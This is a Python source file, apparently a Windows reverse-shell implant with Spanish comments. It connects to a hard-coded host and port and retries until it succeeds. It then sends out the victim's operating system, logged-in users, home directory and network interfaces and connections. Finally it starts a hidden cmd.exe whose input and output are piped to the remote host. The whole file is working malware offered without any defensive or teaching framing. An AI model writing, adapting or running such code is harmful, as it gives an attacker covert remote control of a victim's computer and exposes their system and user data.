import os
import platform
import socket
import subprocess
import threading
import time
import psutil

def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

def send_system_info(s):
    # Información del sistema operativo
    system_info = platform.uname()
    info_str = f"System: {system_info.system}\nNode Name: {system_info.node}\nRelease: {system_info.release}\nVersion: {system_info.version}\nMachine: {system_info.machine}\nProcessor: {system_info.processor}\n"
   
    # Información de usuarios
    users = psutil.users()
    info_str += "\nUsers:\n"
    for user in users:
        info_str += f"- Username: {user.name}, Terminal: {user.terminal}, Host: {user.host}, Login Time: {user.started}\n"

    # Información de directorios
    home_directory = os.path.expanduser("~")
    info_str += f"\nHome Directory: {home_directory}\n"
    
    
    # Información de red
    net_if_addrs = psutil.net_if_addrs()
    net_connections = psutil.net_connections()
    info_str += "\nNetwork Interfaces:\n"
    for interface, addresses in net_if_addrs.items():
        info_str += f"- Interface: {interface}\n"
        for address in addresses:
            info_str += f"  - Family: {address.family}, Address: {address.address}\n"
    info_str += "\nNetwork Connections:\n"
    for conn in net_connections:
        info_str += f"- PID: {conn.pid}, Local Address: {conn.laddr}\n"     
    """
    # Información de la CPU
    # cpu_info = psutil.cpu_info()
    cpu_count = psutil.cpu_count()
    cpu_percent = psutil.cpu_percent()
    cpu_stats = psutil.cpu_stats()
    info_str += f"\nCPU Count: {cpu_count}\nCPU Percent: {cpu_percent}%\nCPU Stats: {cpu_stats}\n"

    # Información de memoria
    memory_info = psutil.virtual_memory()
    swap_info = psutil.swap_memory()
    info_str += f"\nMemory Usage: {memory_info.used}/{memory_info.total}\nSwap Usage: {swap_info.used}/{swap_info.total}\n"
    
    # Información de disco
    disk_partitions = psutil.disk_partitions()
    disk_usage = psutil.disk_usage("/")
    info_str += "\nDisk Partitions:\n"
    for partition in disk_partitions:
        info_str += f"- Device: {partition.device}, Mountpoint: {partition.mountpoint}\n"
    info_str += f"\nDisk Usage: Total={disk_usage.total}, Used={disk_usage.used}, Free={disk_usage.free}\n"
    """
    

    s.sendall(info_str.encode())

def connect_with_retry():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect(("192.168.1.36", 9001))
            message = "Conexion establecida"
            s.sendall(message.encode())
            send_system_info(s)

            p = subprocess.Popen(["cmd"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW)  # Utiliza la bandera "CREATE_NO_WINDOW" para hacer el proceso invisible

            s2p_thread = threading.Thread(target=s2p, args=[s, p])
            s2p_thread.daemon = True
            s2p_thread.start()

            p2s_thread = threading.Thread(target=p2s, args=[s, p])
            p2s_thread.daemon = True
            p2s_thread.start()

            try:
                p.wait()
            except KeyboardInterrupt:
                s.close()
                break
        except ConnectionRefusedError:
            print("Connection failed. Retrying in 5 seconds...")
            time.sleep(5)
        except ConnectionResetError:
            print("Connexion finalizada por el host.")
            p.kill()
            break

connect_with_retry()
